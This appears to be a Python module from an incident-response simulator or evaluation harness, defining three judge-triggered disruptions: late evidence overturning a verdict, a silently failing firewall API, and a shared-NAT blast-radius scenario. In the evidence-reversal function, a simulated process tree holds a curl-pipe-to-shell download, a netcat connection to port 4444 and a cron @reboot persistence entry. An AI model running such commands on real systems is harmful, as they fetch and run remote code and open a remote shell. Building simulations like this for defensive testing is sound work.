"""The three judge-triggered disruptions. Each mutates a live World in place
and returns a one-line description for the UI/demo narration. None of these
run automatically — a judge (or the eval harness, for the acceptance test)
calls them mid-case.
"""
from __future__ import annotations

from ..env.world import World


def inject_evidence_reversal(world: World, alert: dict) -> str:
    """Late evidence overturns a closed 'FAILED' verdict: beacon + persistence appear.

    Meant for a FAILED-verdict case. Mutates the destination host's process
    tree to show a spawned shell/persistence and its flow to show a sustained
    outbound beacon, then appends a '_late' alert note so nids_alerts surfaces
    it. Re-running investigate() on this world will re-derive H1 (SUCCEEDED).
    """
    host_ip = alert["dst"]
    asset = world.assets.get(host_ip, {})
    host = asset.get("host", f"host-{host_ip.replace('.', '-')}")
    world.proc_trees[host] = {
        "suspicious": True,
        "tree": "java -> sh -c 'curl {}|sh' -> nc {} 4444".format(alert["src"], alert["src"]),
        "persistence": "cron @reboot /tmp/.beacon",
    }
    flow_id = alert.get("flow_id", "f_late")
    world.flows[flow_id] = {
        "direction": "outbound", "bytes_out": 91120, "bytes_in": 640,
        "duration_s": 612, "state": "ESTABLISHED",
        "note": "NEW: periodic 60s beacon to external host (was not present before)",
    }
    world.alert.setdefault("_late", []).append({
        "note": "late syslog batch: outbound beacon observed post-closure",
        "flow_id": flow_id,
    })
    return (f"Late evidence on {host}: shell spawned, persistence installed, "
            f"outbound beacon to {alert['src']}. This contradicts a closed FAILED verdict.")


def inject_action_failure(world: World) -> str:
    """The firewall API will accept rules (200 OK) but never commit them.

    Meant to be set BEFORE the response phase runs. The verify step (env_probe)
    will catch the gap and the executor falls back to EDR host quarantine.
    """
    world.silent_fail = True
    return "Firewall API is now silently failing: fw_apply returns 200 OK but rules stay staged, never committed."


def inject_override_scenario(world: World, alert: dict) -> str:
    """Make the attacker's source IP a shared NAT egress with real user traffic,
    AND give it a second malicious destination — decide() only widens from a
    narrow src->dst:port rule to a broad src-IP block when the source is
    hitting more than one target, and blast radius only matters for the broad
    rule. The judge then overrides the resulting escalation.
    """
    src = alert["src"]
    world.assets[src] = {
        "host": "office-nat", "is_shared_nat": True, "users_behind": 340,
        "services": {}, "peers": [],
    }
    world.sessions.append({
        "src": src, "dst": "10.2.5.77", "port": 445, "legit": False,
    })
    for i in range(4):
        world.sessions.append({
            "src": src, "dst": f"10.2.9.{10 + i}", "port": 443, "legit": True,
        })
    return (f"{src} is now flagged as a shared NAT egress serving 340 users, "
            f"is also hitting a second target (forcing a broad block), "
            f"with 4 concurrent legitimate sessions through it.")
